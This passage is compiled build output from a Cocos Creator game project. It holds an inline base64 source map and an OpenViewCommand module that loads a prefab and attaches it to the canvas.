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FBQyxDQUFDLENBQUMsSUFBSSxJQUFJLEdBQUcsS0FBSyxDQUFDO29CQUN6QyxHQUFHLENBQUMsSUFBSSxDQUFDLGVBQWUsQ0FBQyxLQUFLLENBQUMsQ0FBQTtpQkFDbEM7cUJBQUs7b0JBQ0YsR0FBRyxDQUFDLFFBQVEsQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLElBQUksT0FBTyxDQUFDO2lCQUN2QztnQkFDRCxLQUFLLElBQUksT0FBTyxDQUFDO1lBQ3JCLENBQUMsQ0FBQyxDQUFDO1lBQ0gsTUFBTSxDQUFDLE1BQU0sQ0FBQyxLQUFLLENBQUMsQ0FBQztZQUNyQixHQUFHLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLENBQUMsQ0FBQztRQUMvQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDVCxDQUFDO0lBckJlLGdCQUFZLGVBcUIzQixDQUFBO0FBQ0wsQ0FBQyxFQXBJYSxHQUFHLEdBQUgsV0FBRyxLQUFILFdBQUcsUUFvSWhCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbmltcG9ydCBBY3Rpb25zIGZyb20gXCIuLi9hY3Rpb25zL0FjdGlvbnNcIjtcclxuXHJcbmxldCBfaXNMYW5kc2NhcGUgPSBmYWxzZTtcclxuaWYgKHdpbmRvdy5pbm5lcldpZHRoID4gd2luZG93LmlubmVySGVpZ2h0KXtcclxuICAgIF9pc0xhbmRzY2FwZSA9IHRydWU7XHJcbn1cclxuXHJcbmxldCBfaXNJcGhvbmVYID0gZmFsc2U7XHJcbmlmICh3aW5kb3cuaW5uZXJXaWR0aCA8IHdpbmRvdy5pbm5lckhlaWdodCl7XHJcbiAgICBfaXNJcGhvbmVYID0gd2luZG93LmlubmVyV2lkdGgvd2luZG93LmlubmVySGVpZ2h0ID09IDExMjUvMjQzNjtcclxufSBlbHNle1xyXG4gICAgX2lzSXBob25lWCA9IHdpbmRvdy5pbm5lcldpZHRoL3dpbmRvdy5pbm5lckhlaWdodCA9PSAxMTI1LzI0MzY7XHJcbn1cclxuXHJcbmV4cG9ydCBtb2R1bGUgZXh0e1xyXG4gICAgZXhwb3J0IGZ1bmN0aW9uIHNodWZmbGUoYUFycil7XHJcbiAgICAgICAgbGV0IGlMZW5ndGggPSBhQXJyLmxlbmd0aCxcclxuICAgICAgICAgICAgaSA9IGlMZW5ndGgsXHJcbiAgICAgICAgICAgIG1UZW1wLFxyXG4gICAgICAgICAgICBpUmFuZG9tO1xyXG5cclxuICAgICAgICB3aGlsZShpLS0pe1xyXG4gICAgICAgICAgICBpZihpICE9PSAoaVJhbmRvbSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGlMZW5ndGgpKSl7XHJcbiAgICAgICAgICAgICAgICBtVGVtcCA9IGFBcnJbaV07XHJcbiAgICAgICAgICAgICAgICBhQXJyW2ldID0gYUFycltpUmFuZG9tXTtcclxuICAgICAgICAgICAgICAgIGFBcnJbaVJhbmRvbV0gPSBtVGVtcDtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgcmV0dXJuIGFBcnI7XHJcbiAgICB9XHJcblxyXG4gICAgZXhwb3J0IGZ1bmN0aW9uIHJhbmRvbUVsZW1lbnQoYUFycjpBcnJheSkge1xyXG4gICAgICAgIGlmIChhQXJyLmxlbmd0aCA9PSAwKXtcclxuICAgICAgICAgICAgcmV0dXJuIG51bGw7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCBpbmRleCA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGFBcnIubGVuZ3RoKTtcclxuICAgICAgICByZXR1cm4gYUFycltpbmRleF07XHJcbiAgICB9XHJcblxyXG4gICAgZXhwb3J0IGZ1bmN0aW9uIGNyZWF0ZU9iaihuYW1lOlN0cmluZywgLi4uYXJncykge1xyXG4gICAgICAgIGxldCBvYmogPSBjYy5qcy5nZXRDbGFzc0J5TmFtZShuYW1lKTtcclxuICAgICAgICBpZiAodHlwZW9mIG9iaiA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgY2MuZXJyb3IoYCR7bmFtZX0gbm90IGRlZmluZSBAY2NjbGFzcygke25hbWV9KWApO1xyXG4gICAgICAgIH0gZWxzZSBpZiAodHlwZW9mIG9iaiA9PSBcImZ1bmN0aW9uXCIpIHtcclxuICAgICAgICAgICAgb2JqLnByb3RvdHlwZS5jb25zdHJ1Y3Rvci5hcHBseShvYmosIC4uLmFyZ3MpO1xyXG4gICAgICAgICAgICByZXR1cm4gb2JqLnByb3RvdHlwZTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIG51bGw7XHJcbiAgICB9XHJcbiAgICBcclxuICAgIGV4cG9ydCBmdW5jdGlvbiBldmVyeU5vZGUocm9vdDpjYy5Ob2RlLCBmOihub2RlKT0+dm9pZCkge1xyXG4gICAgICAgIGYocm9vdCk7XHJcbiAgICAgICAgcm9vdC5jaGlsZHJlbi5mb3JFYWNoKHZhbHVlID0+IGV2ZXJ5Tm9kZSh2YWx1ZSwgZikpO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cG9ydCBjb25zdCBpc0xhbmRzY2FwZSA9IF9pc0xhbmRzY2FwZTtcclxuICAgIGV4cG9ydCBjb25zdCBpc0lwaG9uZVggPSBfaXNJcGhvbmVYO1xyXG5cclxuXHJcbiAgICBleHBvcnQgYXN5bmMgZnVuY3Rpb24gd3hDcmVhdGVJbWFnZVRvU3ByaXRlKHNwcml0ZSx1cmwpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IG5vZGUgPSBzcHJpdGUubm9kZTtcclxuICAgICAgICAgICAgbGV0IHNpemUgPSB7d2lkdGg6bm9kZS53aWR0aCAsIGhlaWdodDpub2RlLmhlaWdodH07XHJcbiAgICAgICAgICAgIGxldCBpbWFnZSA9IHd4LmNyZWF0ZUltYWdlKCk7XHJcbiAgICAgICAgICAgIGltYWdlLm9ubG9hZCA9IGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgIGlmIChzcHJpdGUgJiYgc3ByaXRlLm5vZGUgJiYgc3ByaXRlLm5vZGUuaXNWYWxpZCl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRleHR1cmUgPSBuZXcgY2MuVGV4dHVyZTJEKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgdGV4dHVyZS5pbml0V2l0aEVsZW1lbnQoaW1hZ2UpO1xyXG4gICAgICAgICAgICAgICAgICAgIHRleHR1cmUuaGFuZGxlTG9hZGVkVGV4dHVyZSgpO1xyXG4gICAgICAgICAgICAgICAgICAgIHNwcml0ZS5zcHJpdGVGcmFtZSA9IG5ldyBjYy5TcHJpdGVGcmFtZSh0ZXh0dXJlKTtcclxuICAgICAgICAgICAgICAgICAgICBub2RlLndpZHRoID0gc2l6ZS53aWR0aDtcclxuICAgICAgICAgICAgICAgICAgICBub2RlLmhlaWdodCA9IHNpemUuaGVpZ2h0O1xyXG4gICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfTtcclxuICAgICAgICAgICAgaW1hZ2Uuc3JjID0gdXJsO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cG9ydCBmdW5jdGlvbiByYW5kb21JbnRlZ2VyKG1pbjpudW1iZXIsIG1heDpudW1iZXIpIHtcclxuICAgICAgICBsZXQgZGlmZiA9IG1heCAtIG1pbjtcclxuICAgICAgICByZXR1cm4gTWF0aC5mbG9vcihtaW4gKyAoTWF0aC5yYW5kb20oKSpkaWZmKjEwMCklKGRpZmYrMSkpXHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOS/ruWkjeW8leaTjueahGJ1Z++8jGNjLlJpY2hUZXh05pyJ5pe25YCZ6K6+572u5LqGc3RyaW5n5ZCO5Lya5a+86Ie05LiN5pi+56S655qE6Zeu6aKYICovXHJcbiAgICBleHBvcnQgZnVuY3Rpb24gc2hvd1JpY2hUZXh0KHJpY2hUZXh0OmNjLlJpY2hUZXh0KSB7XHJcbiAgICAgICAgcmljaFRleHQubm9kZS5jaGlsZHJlbi5mb3JFYWNoKHZhbHVlID0+IHZhbHVlLmFjdGl2ZSA9IHRydWUpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDlubbooYzmiafooYxwcm9taXNlICovXHJcbiAgICBleHBvcnQgYXN5bmMgZnVuY3Rpb24gY29uY3VycmVudEV4ZWN1dGUobGlzdDpBcnJheTxQcm9taXNlPikge1xyXG4gICAgICAgIGZvciAobGV0IHByb21pc2Ugb2YgbGlzdCl7XHJcbiAgICAgICAgICAgIGF3YWl0IHByb21pc2U7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIC8qKiDmmK/lkKblkIzkuIDlpKkgKi9cclxuICAgIGV4cG9ydCBmdW5jdGlvbiBpc1NhbWVEYXkoZGF0ZTE6RGF0ZSwgZGF0ZTI6RGF0ZSkge1xyXG4gICAgICAgIHJldHVybiBkYXRlMS5nZXRGdWxsWWVhcigpID09IGRhdGUyLmdldEZ1bGxZZWFyKCkgJiYgZGF0ZTEuZ2V0TW9udGgoKSA9PSBkYXRlMi5nZXRNb250aCgpICYmIGRhdGUxLmdldERhdGUoKSA9PSBkYXRlMi5nZXREYXRlKCk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKiDovazmjaLmlbDlrZfkuLprIG0gYiB0Ki9cclxuICAgIGV4cG9ydCBmdW5jdGlvbiBzaG9ydEZvcm1hdChudW06bnVtYmVyKTpzdHJpbmcge1xyXG4gICAgICAgIGxldCByZXN1bHQgPSBcIlwiO1xyXG4gICAgICAgIGxldCB0ID0gMTAwMCAqIDEwMDAgKiAxMDAwICogMTAwMDtcclxuICAgICAgICBsZXQgYiA9IDEwMDAgKiAxMDAwICogMTAwMDtcclxuICAgICAgICBsZXQgbSA9IDEwMDAgKiAxMDAwO1xyXG4gICAgICAgIGxldCBrID0gMTAwMDtcclxuICAgICAgICBpZiAobnVtID49IHQpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSBNYXRoLmZsb29yKG51bS90KjEwKS8xMCArIFwiVFwiO1xyXG4gICAgICAgIH0gZWxzZSBpZiAobnVtID49IGIpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSBNYXRoLmZsb29yKChudW0vYikqMTApLzEwICsgXCJCXCI7XHJcbiAgICAgICAgfWVsc2UgaWYgKG51bSA+PSBtKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gTWF0aC5mbG9vcigobnVtL20pKjEwKS8xMCArIFwiTVwiO1xyXG4gICAgICAgIH1lbHNlIGlmIChudW0gPj0gayl7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IE1hdGguZmxvb3IoKG51bS9rKSoxMCkvMTAgKyBcIktcIjtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IE1hdGguZmxvb3IobnVtKS50b1N0cmluZygpO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gcmVzdWx0O1xyXG4gICAgfVxyXG5cclxuICAgIGV4cG9ydCBmdW5jdGlvbiBtb3ZlU2tlbGV0b24oc2tlOnNwLlNrZWxldG9uLCBzcmNZOm51bWJlciwgcmVhbFk6bnVtYmVyLCBkZWF5VGltZTpudW1iZXIsIG1vdmVUaW1lOm51bWJlciwgYm9uZU5hbWU6c3RyaW5nLCBib25lWTpudW1iZXIpIHtcclxuICAgICAgICBsZXQgc3ViWSA9IHJlYWxZIC0gc3JjWTtcclxuICAgICAgICBsZXQgc3BlZWQgPSBzdWJZL21vdmVUaW1lO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PnNyY1k9XCIrc3JjWSwgXCJyZWFsWT1cIityZWFsWSwgXCJzdWJZPVwiK3N1YlksIFwic3BlZWQ9XCIrc3BlZWQsIFwieT1cIitza2UuZmluZEJvbmUoYm9uZU5hbWUpLnkpO1xyXG4gICAgICAgIHNrZS5maW5kQm9uZShib25lTmFtZSkueSA9IGJvbmVZO1xyXG4gICAgICAgIHNrZS5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoZGVheVRpbWUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICBsZXQgbW92ZVkgPSAwO1xyXG4gICAgICAgICAgICBsZXQgYWN0aW9uID0gQWN0aW9ucy51cGRhdGUoKGR0Om51bWJlcik9PntcclxuICAgICAgICAgICAgICAgIGxldCBtb3ZlTGVuID0gZHQqc3BlZWQ7XHJcbiAgICAgICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIuenu+WKqOmqqOmqvHlcIiwgbW92ZUxlbiwgZHQsIHNwZWVkLCBtb3ZlWSwgc3ViWSk7XHJcbiAgICAgICAgICAgICAgICBpZiAoTWF0aC5hYnMobW92ZVkgKyBtb3ZlTGVuKSA+PSBNYXRoLmFicyhzdWJZKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgc2tlLmZpbmRCb25lKGJvbmVOYW1lKS55ICs9IHN1YlkgLSBtb3ZlWTtcclxuICAgICAgICAgICAgICAgICAgICBza2Uubm9kZS5zdG9wQWN0aW9uQnlUYWcoMTAwMjApXHJcbiAgICAgICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2tlLmZpbmRCb25lKGJvbmVOYW1lKS55ICs9IG1vdmVMZW47XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBtb3ZlWSArPSBtb3ZlTGVuO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgYWN0aW9uLnNldFRhZygxMDAyMCk7XHJcbiAgICAgICAgICAgIHNrZS5ub2RlLnJ1bkFjdGlvbihhY3Rpb24pO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcbn1cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/facade/OpenViewCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b27f8KHhAhEG5gWtv30iiyW', 'OpenViewCommand');
// framework/facade/OpenViewCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("./Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var OpenViewCommand = /** @class */ (function () {
    function OpenViewCommand() {
    }
    OpenViewCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var prefabName, prefab, node;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    prefabName = args[0];
                                    if (!Facade_1.default.canvasNode.getChildByName(prefabName.substring(prefabName.lastIndexOf("/") + 1))) return [3 /*break*/, 1];
                                    console.error("\u6B64\u7A97\u53E3\u5DF2\u6253\u5F00===>" + prefabName, "或者是prefab根节点名称与其他prefab根节点名称冲突...规则：prefab名称要与该prefab根节点名称一致。");
                                    reject();
                                    return [3 /*break*/, 3];
                                case 1: return [4 /*yield*/, cc.loader.loadResAwait(prefabName, cc.Prefab)];
                                case 2:
                                    prefab = _a.sent();
                                    node = cc.instantiate(prefab);
                                    node.setParent(Facade_1.default.canvasNode);
                                    resolve(node);
                                    _a.label = 3;
                                case 3: return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    OpenViewCommand = __decorate([
        ccclass("OpenViewCommand")
    ], OpenViewCommand);
    return OpenViewCommand;
}());
exports.default = OpenViewCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZmFjYWRlL09wZW5WaWV3Q29tbWFuZC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7QUFJbkcsbUNBQThCO0FBRXhCLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQUE7SUFnQkEsQ0FBQztJQWRTLGlDQUFPLEdBQWI7UUFBYyxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOzs7Z0JBQzFCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQU0sT0FBTyxFQUFFLE1BQU07Ozs7O29DQUNoQyxVQUFVLEdBQVUsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO3lDQUM3QixnQkFBTSxDQUFDLFVBQVUsQ0FBQyxjQUFjLENBQUMsVUFBVSxDQUFDLFNBQVMsQ0FBQyxVQUFVLENBQUMsV0FBVyxDQUFDLEdBQUcsQ0FBQyxHQUFDLENBQUMsQ0FBQyxDQUFDLEVBQXJGLHdCQUFxRjtvQ0FDcEYsT0FBTyxDQUFDLEtBQUssQ0FBQyw2Q0FBYSxVQUFZLEVBQUUsK0RBQStELENBQUMsQ0FBQztvQ0FDMUcsTUFBTSxFQUFFLENBQUM7O3dDQUVJLHFCQUFNLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLFVBQVUsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLEVBQUE7O29DQUE1RCxNQUFNLEdBQUcsU0FBbUQ7b0NBQzVELElBQUksR0FBVyxFQUFFLENBQUMsV0FBVyxDQUFDLE1BQU0sQ0FBQyxDQUFDO29DQUMxQyxJQUFJLENBQUMsU0FBUyxDQUFDLGdCQUFNLENBQUMsVUFBVSxDQUFDLENBQUM7b0NBQ2xDLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQzs7Ozs7eUJBRXJCLENBQUMsRUFBQzs7O0tBQ047SUFmZ0IsZUFBZTtRQURuQyxPQUFPLENBQUMsaUJBQWlCLENBQUM7T0FDTixlQUFlLENBZ0JuQztJQUFELHNCQUFDO0NBaEJELEFBZ0JDLElBQUE7a0JBaEJvQixlQUFlIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV